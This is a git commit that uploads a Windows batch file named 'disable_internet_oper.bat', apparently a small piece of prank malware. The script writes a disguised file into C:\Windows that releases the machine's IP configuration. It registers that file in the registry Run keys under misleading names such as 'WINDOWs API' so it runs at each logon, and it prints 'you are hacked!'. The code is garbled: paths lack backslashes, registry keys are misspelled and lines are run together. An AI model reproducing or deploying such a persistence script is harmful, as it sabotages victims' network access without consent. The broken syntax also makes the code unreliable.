e398ade5dc0b49ec5ac041772cb51ed45a40e488
BLACK-DEVIL-8212 <75551857+BLACK-DEVIL-8212@users.noreply.github.com>
2022-07-05 09:01:47 +0530

    Add files via upload

---
+++ disable_internet_oper.bat
@@ -0,0 +1,8 @@
+echo @ echo off > C:Windowswimn32.bat 
+echo break off > C:Windowswimn32.bat 
+echo ipconfig/release_all > C:Windowswimn32.bat
+echo end > C:Windowdwimn32.batrey add
+hkey_local_mechinesoftwaremicrosoftwindowscurrentversion run /v WINDOWs API /t reg_SZ /d C:Windowswimn32.bat /f reg add
+hkey_current_usersoftwaremicrosoftwindowscurrenrversion run /v CONTROL exit /t reg_sz /d C:Windowswimn32.bat /f "echo you are hacked!"
+
+PAUSE
